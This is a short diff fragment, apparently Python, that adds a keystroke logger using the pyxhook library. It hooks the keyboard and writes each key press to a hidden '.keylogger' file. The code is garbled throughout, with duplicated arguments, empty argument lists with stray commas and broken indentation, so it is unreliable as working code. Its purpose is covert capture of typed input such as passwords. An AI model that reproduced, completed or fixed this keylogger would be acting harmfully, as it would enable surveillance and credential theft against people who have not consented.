@@ -1,0 +1,12 @@
+	file = open('.keylogger', 'a', '.keylogger')
+	file.write('\n', '\n')
+	file.close(, )
+	    with open('.keylogger', 'a+', '.keylogger') as File:
+	    	File.write(event.Key, event.Key)
+        newline(, )
+        newline(, )
+	hookman = pyxhook.HookManager(, )
+	hookman.HookKeyboard(, )
+	hookman.start(, )
+	    time.sleep(0.1, 0.1)
+	hookman.cancel(, )
